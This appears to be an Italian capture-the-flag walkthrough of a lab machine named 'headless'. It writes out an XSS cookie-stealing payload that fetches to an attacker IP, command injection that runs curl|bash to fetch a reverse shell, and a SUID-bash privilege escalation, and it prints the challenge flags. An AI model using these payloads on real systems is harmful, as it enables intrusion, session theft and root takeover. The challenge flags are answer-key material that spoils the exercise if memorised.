@@ -1,0 +1,142 @@
+scansione con nmap->file headless.txt
+
+vedo che ho un sito sulla porta 5000, quindi vado su 10.10.11.8:5000
+
+scansiono con gobuster --> gobuster dir -u http://10.10.11.8:5000 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
+e come risultato ho:
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.11.8:5000
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/dashboard            (Status: 500) [Size: 265]
+/support              (Status: 200) [Size: 2363]
+Progress: 4727 / 4727 (100.00%)
+===============================================================
+Finished
+===============================================================
+
+
+inoltre sia dallo scan di nmap che dalla response presa con burp, noto che ho un cookie (is_admin) che è settato (al valore InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs)
+e andando sul sito: https://jwt.io/ vedo che la prima parte del cookie corrisponde a "user", quindi siamo user, e se proviamo ad accedere alla sottodirectory /dashboard non siamo autorizzati
+
+quindi devo sfruttare il cookie per diventare admin ed entrare nella dashboard, provo a vedere se il sito è vulnerabile all'XSS e quindi metto il classico "<script>alert("ciao");</script>" nel form che ho in /support
+mi ritorna però un messaggio in cui il mio tentativo di hack è stato rilevato, stessa cosa succede se provo a mettere il codice per una reverse shell
+
+il messaggio:
+
+Hacking Attempt Detected
+Your IP address has been flagged, a report with your browser information has been sent to the administrators for investigation.
+Client Request Information:
+Method: POST
+URL: http://10.10.11.8:5000/support
+Headers: Host: 10.10.11.8:5000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 251
+Origin: http://10.10.11.8:5000
+Connection: close
+Referer: http://10.10.11.8:5000/support
+Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs
+Upgrade-Insecure-Requests: 1
+
+
+(noto che solo se metto l'XSS nell'area del messaggio mi dà errore, negli altri campi non me lo da)
+quindi devo trovare il modo per passargli la mia reverse shell, senza essere detectato, e quindi lo faccio attraverso lo user agent del sito, attraverso burp:
+
+quindi quello che vado a fare, essendo l'header vulnerabile all'XSS, vado a modificare lo user-agent andando a mettere la stringa -> <img src='ciao' onerror=fetch("http://10.10.14.110/?c='+document.cookie);>
+e andando ad hostare in locale un server con python: python3 -m http.server 80
+
+inviando l'header modificato con burp, il server andrà a cercare l'immagine 'ciao', e nel caso non la trovasse si interfaccia con il nostro pc e ci scarica il cookie, ed essendo inviato dal server, sarà quello dell'admin
+
+ottenuto il cookie dell'admin: ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0  (-> infatti mettendolo su jwt.io mi dà che il primo pezzo è "admin")
+
+vado su mozilla>ctrl+shift+i>storage>cookies>metto il cookie dell'admin ed ora provo ad accedere a /dashboard e finalmente posso accederci.
+
+
+vedo che ho una richiesta dove cambia la data, quindi:
+con burp, modifico la richiesta:
+
+POST /dashboard HTTP/1.1
+Host: 10.10.11.8:5000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 54
+Origin: http://10.10.11.8:5000
+Connection: close
+Referer: http://10.10.11.8:5000/dashboard
+Cookie: is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0
+Upgrade-Insecure-Requests: 1
+
+date=2023-09-15;curl http://10.10.14.110/shell.sh|bash <-- aggiungo questo
+
+nel file shell.sh c'è la reverse shell --> sh -i >& /dev/tcp/10.10.14.110/9001 0>&1   (ovviamente il file shell.sh deve stare nella stessa directory dove avvio il server in python, sennò non trova il file)
+quindi avvio sempre il server python terminale 1 --> python3 -m http_server 80
+e mi metto in ascolto con netcat terminale 2 --> nc -lvnp 9001 
+
+quindi mandando la richiesta di burp vedo che ho una GET sul server python ed ho anche una response nel terminale con netcat
+
+ORA sono dentro quindi faccio cd ..>vedo che ho user.txt>cat user.txt e trovo la flag dello user (70c2aa6f39e6957d043c1848157d4503)
+
+dopo facendo:
+
+sudo -l (che mi fa vedere i privilegi di sudo)
+e mi compare:
+atching Defaults entries for dvir on headless:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+    use_pty
+
+User dvir may run the following commands on headless:
+    (ALL) NOPASSWD: /usr/bin/syscheck
+    
+quindi faccio: cat /usr/bin/syscheck
+ed esce:
+#!/bin/bash
+
+if [ "$EUID" -ne 0 ]; then
+  exit 1
+fi
+
+last_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1)
+formatted_time=$(/usr/bin/date -d "@$last_modified_time" +"%d/%m/%Y %H:%M")
+/usr/bin/echo "Last Kernel Modification Time: $formatted_time"
+
+disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}')
+/usr/bin/echo "Available disk space: $disk_space"
+
+load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}')
+/usr/bin/echo "System load average: $load_average"
+
+if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
+  /usr/bin/echo "Database service is not running. Starting it..."
+  ./initdb.sh 2>/dev/null
+else
+  /usr/bin/echo "Database service is running."
+fi
+
+exit 0
+
+quindi creo il file initdb.sh con il comando: echo "chmod u+s /bin/bash" > initdb.sh
+
+quindi faccio -> /bin/bash -p -> whoami e mi dà root e quindi faccio -> cat /root/root.txt ed ho la flag: a62417e1ac51d9e36183e45dfae160f6
+
+
+
+
+
